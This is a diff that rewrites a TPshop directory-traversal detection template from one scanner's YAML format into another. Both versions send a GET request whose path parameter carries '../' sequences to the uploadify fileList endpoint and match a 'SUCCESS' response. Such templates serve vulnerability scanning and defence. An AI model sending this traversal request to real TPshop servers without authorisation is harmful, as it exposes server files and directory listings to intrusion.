@@ -1,34 +1,16 @@
 id: tpshop-directory-traversal
 
 info:
-  name: TPshop - Local File Inclusion
-  author: pikpikcu
-  description: TPshop is vulnerable to local file inclusion.
-  severity: high
-  reference:
-    - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
-  tags: tpshop,lfi
-  metadata:
-    max-request: 1
+    name: Tpshop Directory Traversal
+    author: 清风明月(www.secbook.info)
+    severity: high
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../"
-
-    matchers-condition: and
-    matchers:
-
-      - type: word
-        words:
-          - '"state":"SUCCESS"'
-
-      - type: status
-        status:
-          - 200
-
-# Enhanced by mp on 2022/08/04
+rules:
+    r0:
+        request:
+            method: GET
+            path: /index.php/Home/uploadify/fileList?type=.+&path=../
+            headers:
+                Accept-Encoding: deflate
+        expression: response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\""))) && response.body.bcontains(bytes(string("total")))
+expression: r0()
